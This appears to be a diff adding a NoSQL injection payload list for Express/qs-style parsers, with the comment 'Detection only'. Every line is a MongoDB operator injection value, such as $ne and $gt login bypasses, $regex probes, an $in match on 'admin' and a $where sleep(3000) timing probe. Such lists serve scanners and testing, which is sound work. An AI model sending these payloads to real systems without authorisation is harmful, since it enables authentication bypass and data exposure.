@@ -1,0 +1,15 @@
+# NoSQL injection — bracket-syntax operator payloads for Express/qs-style parsers.
+# {P} is replaced with the target parameter name. Detection only.
+{P}[$ne]=1
+{P}[$gt]=
+{P}[$gte]=
+{P}[$lt]=~
+{P}[$in][]=admin
+{P}[$nin][]=x
+{P}[$regex]=^adm
+{P}[$regex]=.{1,}
+{P}[$where]=1
+{P}[$where]=sleep(3000)
+{P}[$exists]=false
+{P}[$type]=2
+{P}[$not][$eq]=x
